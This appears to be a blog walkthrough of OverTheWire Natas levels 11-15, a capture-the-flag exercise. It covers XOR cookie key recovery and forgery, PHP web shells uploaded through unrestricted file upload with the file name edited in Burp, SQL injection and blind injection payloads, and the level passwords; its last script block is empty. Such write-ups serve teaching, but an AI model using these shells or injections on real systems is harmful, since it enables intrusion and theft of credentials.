---
layout: single
title: "OverTheWire: 'Natas' Solutions 11-15"
header:
  teaser: oth.png
  overlay_image: ZenBGG.png
  caption: "[__OverTheWire__](http://overthewire.org/wargames/)"
related: true
comments: true
---

### Level 11:

So the cookies are protected with a XOR Encryption... interesting! Let's go ahead and grab the cookie that the site is using. Fire up Burp, capture the packet and you should get the following: 

`Set Cookie: "data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"`

Now let's go ahead and see what the source code holds for us.

```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```

If you know what a [XOR Cipher](https://en.wikipedia.org/wiki/XOR_cipher) is then you would remember that _A_ __XOR__ _B_ = _C_.

In this case, it would be: _Original_Data_ __XOR__ _KEY_ = _Encrypted_Data_.

Thus to get the __Key__ we do the following: _Original_Data_ __XOR__ _Encrypted_Data_ = _KEY_, since we already are provided with the __Original_Data__ and __Encrypted_Data__.

Sounds easy enough, right? Good! Let's fire up PHP and write the following script to reverse engineer the key.

```php
<?
function xor_encrypt($text) {
    $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
    $outText = '';
 
    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
 
    return $outText;
}
 
$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
print xor_encrypt(json_encode($data));
?>
```

And we will get the __Key__ Output of `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`. Okay, great. So let's go back and edit our code, and replace the `$key` with our newly found key, and also edit the __showpassword__ to __yes__.

```php
<?
function xor_encrypt($text) {
    $key = 'qw8J';
    $outText = '';
 
    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
 
    return $outText;
}
 
$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
print base64_encode(xor_encrypt(json_encode($data)));
?>
```

Once we run the new PHP script we should get an output of our cookie: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`.

With this new cookie, let's go back to Burp and submit it to the page. If done correctly, we should get the password `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`. Now we can move on to level 12!

### Level 12:
File upload

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

Okay... file upload. The first thing that I can think of, off the top of my head is an [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). So let's go ahead and test for this vulnerability. We can begin by creating a simple PHP Shell that will echo back the contents of __/etc/natas_webpass/natas13__.

```php
<?
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output</pre>";
?>
```

Once done, save it as __shell.php__. Go back to the website, click __Browse__ and select our shell. BUT! Before you click __Upload__, fire up Burp and set up the Burp Proxy to intercept packets. Once done, click __Upload__.

Looking at the Burp Intercept, towards the bottom of the page, we can see the following lines:

```js
Content-Disposition: form-data; name="filename"

zvot8u94ri.jpg
-----------------------------15512856191759264131314404296
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/x-php

<?
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output<pre>";
?>

-----------------------------15512856191759264131314404296--
```

We can see that our filename is being changed to __.jpg__ and being renamed. So let's edit that back to __shell.php__, and forward the packet. You should see something along the lines of "__The file upload/etgklnh5pq.php has been uploaded__" come up.

Go ahead and click the __upload/etgklnh5pq.php__ link, and we should get the password `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.

Good job! Not as hard as 11... let's move on to level 13!

### Level 13:
Same thing as 12, only catch is that the upload accepts image files only. Let's see source code.

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

Okay, I'm sure we can exploit this! Let's go ahead and edit __shell.php__ that we used in level 12.This time it has to be pulling the password from Natas14. Also we have to add BMP to the start of the file.

```php
BMP<?
$output = shell_exec('cat /etc/natas_webpass/natas14');
echo "<pre>$output</pre>";
?>
```

We will be doing a repeat of 12, so click __Browse__ and look for __shell.php__, open it, fire up Burp, start up the proxy, and __Upload__ the file!

In Burp's Intercept we should see something along the following lines:

```js
Content-Disposition: form-data; name="filename"

3hwxwqemk3.jpg
-----------------------------1625648362953610391147035725
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/x-php

<?
$output = shell_exec('cat /etc/natas_webpass/natas14');
echo "<pre>$output</pre>";
?>

-----------------------------1625648362953610391147035725--
```

Let's change the name __3hwxwqemk3.jpg__ to __shell.php__, and forward the packet. You should now see something along the lines of "__The file upload/w0yzhafetj.php has been uploaded__". Let's go ahead and click the __upload/w0yzhafetj.php__ link. 

If done correctly we should get the password `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.

Congrats! It was simple enough! I suggest you go read more about [Unrestricted File Uploads](https://www.owasp.org/index.php/Unrestricted_File_Upload) from __OWASP__ as they are an amazing source to learning Web Hacking! We're done here... so moving on to level 14!

### Level 14:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?> 
```

Looking at the PHP script we see that __MySql__ is being used, so we can assume that this login page is vulnerable to a [SQL Injection](https://www.owasp.org/index.php/SQL_Injection) Attack.

Let's look at the query that is being used in the PHP Script.

```php
SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"
```

This can be translated as:

```sql
SELECT * from users where username = "username" and password = "password"
```

Looking at the code, it doesn’t seem to be preventing us from entering any "wrong" input. So for the username and password field, we can enter __"="__. The result is the following SQL Query:

```sql
SELECT * from users where username = ""="" and password = ""=""
```
The SQL query is thus valid, and will return all rows from the table Users, since WHERE ""="" is always true.

If done successfully, you should get the password `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J` and we can move on to level 15!

### Level 15:
My god... this level took me way longer then I am willing to admit! At the end, I figured out that this is a [Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection).

Before we dig deeper let's look at the Source Code.

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

Looking at the query in PHP we can translate it to:

```sql
SELECT * from users where username = "username";
```

Now, I for one always laugh when I see quotes in inputs on web applications that don't do proper input validation. This just speaks "EXPLOIT HERE”. As I stated before this is a Blind SQL Injection, meaning that we are "blind" to generic errors and can only tell what the application is doing by using __true__ or __false__ statements. 

Looking into the code we can also see that the comment states that a table called "__users__" was created, and contains two columns - "__username__" and "__password__"... at least we now know we can try to get the password. 

So, we need to get the password for natas16, and to do that we will have to brute force the password. In general, this will be similar to the brute forcing we did in Bandit, but a little more complex. I will be creating the script to brute force the password using [Python](https://www.python.org/), so I suggest brushing up on it before continuing, or use another language like Ruby, JavaScript, C, etc.

First, let's try and create a SQL Query that will allow us to see what letters are in the __password__ field for natas16. We will try to inject __natas16" and password LIKE BINARY "a%__, and it will bode us this query.

```sql
SELECT * from users where username = "natas16" and password LIKE BINARY "a%"
```

What this query does is basically pull the username __natas16__ and check to see if a certain character is used in their associated password field. We use the [LIKE](http://www.w3schools.com/sql/sql_like.asp) statement to search for specified letters or patterns, and the MySQL Operator [BINARY](http://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#operator_binary) to compare case sensitive letters.

When we run this query, if the character we chose are in the password, the page will return __The user exists__, if the character isn’t in the password, then we will get __The user doesn’t exist__. 

So let's go ahead and write a python script to check for password characters, and then try to brute force the password.

```python

```
